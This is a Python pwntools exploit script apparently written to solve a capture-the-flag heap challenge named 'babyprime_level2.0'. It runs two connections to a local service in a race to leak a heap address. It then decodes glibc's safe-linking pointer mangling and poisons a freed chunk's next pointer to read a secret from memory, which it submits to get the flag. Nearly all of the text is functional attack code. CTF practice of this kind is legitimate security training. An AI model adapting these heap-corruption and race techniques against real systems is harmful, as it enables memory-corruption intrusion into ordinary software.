from pwn import *
import os
import sys

context.arch = 'amd64'

def mangle(target:int, ptr:int, page_offset=0)->int:
    return target ^ ((ptr >> 12) + page_offset)

def demangle(raw:int, page_offset=0)->int:
    pos = (raw >> 12) + page_offset
    m = pos ^ raw
    return m >> 24 ^ m

def warmup_heap(r):
    r.sendline(b'malloc 8')
    r.sendline(b'malloc 9')
    r.sendline(b'malloc 10')
    r.sendline(b'free 10')
    r.sendline(b'free 9')
    r.sendline(b'free 8')

def get_heap_leak(r1, r2):
    pid = os.fork()
    if pid == 0:
        # child
        for _ in range(1000):
            r1.sendline(b'malloc 1 free 1')
        sys.exit(0)
    for _ in range(1000):
        r2.sendline(b'printf 1')
    os.wait()
    raw = r2.clean(1)
    for line in raw.splitlines():
        if b'NONE' not in line:
            leak = line.split(b'MESSAGE: ')[1]
            print(leak)
            print(f'mangled leak = {hex(unpack(leak, "all"))}')
            return demangle(unpack(leak, 'all'), page_offset=-1)

def arb_read(r1, r2, addr, index):
    # addr is already mangled
    # 0x20 is bad byte for scanf
    assert 0x20 not in set(p64(addr))

    while True:
        pid = os.fork()
        if pid == 0:
            # child
            for _ in range(10000):
                r1.sendline(f'malloc {index} free {index}')
            sys.exit(0)
        for _ in range(10000):
            r2.sendline(f'scanf {index} '.encode('utf-8') + p64(addr))
        os.wait()

        # if we successfully overwrote *next of the top chunk in the bin
        r1.sendline(f'malloc {index} printf {index}')
        r1.recvuntil(b'MESSAGE: ')
        result = r1.recvline()[:-1]
        print(f'result = {result}; expected = {p64(addr)}')
        r1.sendline(f'free {index}')
        r1.clean(1)
        r2.clean(1)
        if unpack(result, 'all') == addr:
            break

    r1.sendline(f'malloc 11 malloc 12 printf 12')
    r1.recvuntil(b'MESSAGE: ')
    result = r1.recvline()[:-1]

    #r1.sendline(b'free 11 free 12')

    return result

with process("/challenge/babyprime_level2.0") as p:
    r1 = remote("127.0.0.1", 1337)
    r2 = remote("127.0.0.1", 1337)

    warmup_heap(r1)
    warmup_heap(r2)
    r1.clean(1)
    r2.clean(1)

    heap_leak = get_heap_leak(r1, r2)
    print(f'heap_leak = {hex(heap_leak)}')

    secret = b''
    secret_addr = heap_leak - 0x1380 + 0xf50
    secret += arb_read(r1, r2, mangle(secret_addr, heap_leak, page_offset=-1), 1)

    print(secret)

    r1.sendline(b'send_flag ' + secret)
    print(r1.clean())

    input('holding....')
